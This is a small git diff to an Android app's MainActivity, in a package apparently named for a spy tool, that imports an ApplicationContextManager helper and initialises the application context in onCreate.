@@ -8,6 +8,7 @@ import android.os.Bundle;
 import android.util.Log;
 import android.widget.TextView;
 
+import com.thunderspy.spy.utils.ApplicationContextManager;
 import com.thunderspy.spy.utils.SocketsHolder;
 import com.thunderspy.spy.utils.ThreadPoolManager;
 import com.thunderspy.spy.utils.Utils;
@@ -34,6 +35,9 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        ApplicationContextManager.initApplicationContext(this.getApplicationContext());
+
+
 
         final TextView tv = (TextView)findViewById(R.id.tv);
 
